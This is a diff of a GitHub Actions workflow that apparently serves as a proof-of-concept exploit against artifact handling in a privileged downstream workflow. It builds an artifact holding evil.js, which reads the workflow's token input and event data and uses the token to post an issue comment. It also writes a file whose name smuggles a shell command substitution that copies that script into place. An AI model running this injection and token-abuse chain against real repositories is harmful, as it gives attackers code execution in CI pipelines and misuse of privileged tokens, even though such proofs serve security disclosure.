@@ -1,35 +1,39 @@
 name: Test
 
 on:
-  workflow_dispatch:
   pull_request:
 
 permissions:
   contents: read
 
 jobs:
-  upload:
+  build:
     runs-on: ubuntu-latest
     steps:
-      - name: Build attacker-controlled artifact
+      - name: craft artifact
         run: |
-          set -e
-          mkdir -p content
-          printf 'plain report from artifact\n' > content/x.txt
-          cat > content/evil.js <<'JS'
+          mkdir -p /tmp/content
+          printf 'hello from a forked PR\n' > /tmp/content/report.txt
+          printf 'body\n' > /tmp/content/x.txt
+          cat > /tmp/content/evil.js <<'JS'
           (async () => {
             const t = process.env.INPUT_TOKEN || '';
-            console.log('GAB_PAT_CHANNEL action=' + (process.env.GITHUB_ACTION || '?') + ' token_len=' + t.length + ' keys=' + Object.keys(process.env).filter(k => k.startsWith('INPUT_')).join('|'));
-            if (t) {
-              try {
-                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/8/comments', {
-                  method: 'POST',
-                  headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
-                  body: JSON.stringify({ body: 'GAB_PAT_CHANNEL: code in commit-comment executed with its token input (len=' + t.length + ')' })
-                });
-                console.log('GAB_STATUS ' + r.status);
-              } catch (e) { console.log('GAB_ERR ' + e.message); }
-            }
+            console.log('GAB_WFRUN_RCE action=' + (process.env.GITHUB_ACTION || '?') + ' token_len=' + t.length + ' event=' + process.env.GITHUB_EVENT_NAME);
+            let n = 1;
+            try {
+              const fs = require('node:fs');
+              const ev = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf8'));
+              const wr = ev.workflow_run || {};
+              n = (wr.pull_requests && wr.pull_requests[0] && wr.pull_requests[0].number) || 1;
+            } catch (e) {}
+            try {
+              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments', {
+                method: 'POST',
+                headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
+                body: JSON.stringify({ body: 'GAB_WFRUN_RCE: privileged workflow-run executed attacker JS; token_len=' + t.length })
+              });
+              console.log('GAB_WFRUN_STATUS ' + r.status);
+            } catch (e) { console.log('GAB_WFRUN_ERR ' + e.message); }
             process.exit(0);
           })();
           JS
@@ -42,12 +46,12 @@ jobs:
           inj = "$(" + src + ";cp" + u + "evil.js" + u + "$(" + dst + "))"
           name = "x" + inj + ".txt"
           assert len(name) <= 255, len(name)
-          with open(os.path.join("content", name), "w") as f:
+          with open(os.path.join("/tmp/content", name), "w") as f:
               f.write("injection carrier\n")
           print("created", len(name), name)
           PY
-          ls -la content
+          ls -la /tmp/content
       - uses: actions/upload-artifact@v4
         with:
           name: content
-          path: content
+          path: /tmp/content
